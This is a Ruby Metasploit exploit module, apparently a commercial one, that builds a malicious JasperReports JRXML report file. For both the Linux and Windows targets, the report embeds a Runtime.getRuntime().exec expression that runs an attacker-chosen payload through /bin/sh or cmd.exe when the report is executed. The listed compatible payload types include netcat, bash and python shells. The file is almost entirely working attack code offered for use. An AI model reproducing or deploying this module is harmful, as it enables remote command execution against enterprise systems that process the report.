##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'JasperReports Standalone JRXML',
      'Description'    => %q{
      This module generates a JasperReports JRXML file with
      an embedded payload that is run when the report is executed.

      This module generates a standalone JasperReports JRXML report
      file with an arbitrary embedded payload for either Windows
      or Linux. The payload will be run when the report is executed.
      Many enterprise applications support JasperReports as their reporting
      engine.

    Categories: Enterprise, Command Execution

    Price: 3

    Video: https://asciinema.org/a/2dxM6SmaAQMmsrIDD0xEm0b4p

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
        ],
      'References'     =>
        [
        ],
      'Platform'          => [ 'unix', 'linux', 'windows' ],
      'Arch' => ARCH_CMD,
      'Payload'    =>
    {
      'BadChars' => "<>&\\",
      'Compat'     => {
      'PayloadType'  => 'cmd',
      'RequiredCmd'  => 'generic telnet bash netcat python perl',
    }},
      'Targets'        =>
        [
          [ 'Linux', { }],
	  [ 'Windows', { }]
        ],
      'DisclosureDate' => '',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [ true, 'The output file name.', 'msf.jrxml']),
        ])
  end

  def exploit

    xml = '' 
    if target.name == 'Linux'
      xml = %Q{<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="AllAccounts" pageWidth="595" pageHeight="842" whenNoDataType="AllSectionsNoDetail" columnWidth="515" leftMargin="40" rightMargin="40" topMargin="50" bottomMargin="50" isSummaryWithPageHeaderAndFooter="true" uuid="17f4b3c5-e096-4a65-b030-ed3bb58ce311">
<title>
<band height="79" splitType="Stretch">
<textField>
<reportElement x="227" y="20" width="100" height="30" uuid="32a2a8ff-d90a-48d7-b044-5325b5c6264f"/>
<textFieldExpression><![CDATA[Runtime.getRuntime().exec(new String[] \{"/bin/sh", "-c", "#{payload.encoded}"\})]]></textFieldExpression>
</textField>
</band>
</title>
</jasperReport>
}
    else
      xml = %Q{<?xml version="1.0" encoding="UTF-8"?>
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="AllAccounts" pageWidth="595" pageHeight="842">
<title>
<band height="79" splitType="Stretch">
<textField>
<reportElement x="227" y="20" width="100" height="30" uuid="32a2a8ff-d90a-48d7-b044-5325b5c6264f"/>
<textFieldExpression><![CDATA[Runtime.getRuntime().exec(new String[] \{"cmd.exe", "/c", "#{payload.encoded}"\})]]></textFieldExpression>
</textField>
</band>
</title>
</jasperReport>
}
    end


    # Create the file
    print_status("Creating '#{datastore['FILENAME']}' file...")

    file_create(xml)
  end

end
